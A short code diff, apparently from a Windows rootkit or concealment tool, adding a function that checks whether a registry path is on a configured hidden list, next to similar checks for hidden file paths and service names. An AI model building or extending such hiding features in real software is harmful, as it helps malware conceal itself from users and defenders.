@@ -67,6 +67,10 @@ BOOL IsPathHidden(LPCWSTR path)
 {
 	return Configuration && StringListContains(Configuration->HiddenPaths, path);
 }
+BOOL IsRegistryPathHidden(LPCWSTR path)
+{
+	return Configuration && StringListContains(Configuration->HiddenRegistryPaths, path);
+}
 BOOL IsServiceNameHidden(LPCWSTR name)
 {
 	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
